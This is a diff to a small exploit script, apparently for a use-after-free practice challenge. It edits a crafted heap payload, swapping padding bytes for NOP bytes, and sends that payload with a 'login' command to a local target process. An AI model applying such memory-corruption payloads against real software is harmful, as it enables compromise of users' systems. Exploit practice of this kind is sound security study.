@@ -4,7 +4,7 @@ target = "use-after-free"
 
 p = process(target)
 
-payload = b"a"*16 + b"user"+b"\x0a"*12 +b'\x0a'*16 + b"user"+b"\x0a"*12 + b'\x01'*8 + b'\x21'+b'\x0a'*7
+payload = b"a"*16 + b"user"+b"\x90"*12 +b'\x90'*16 + b"user"+b"\x90"*12 + b'\x01' + b'\x90'*7 + b'\x21'+b'\x90'*7
 
 p.recvuntil(">>>")
 p.sendline("login")
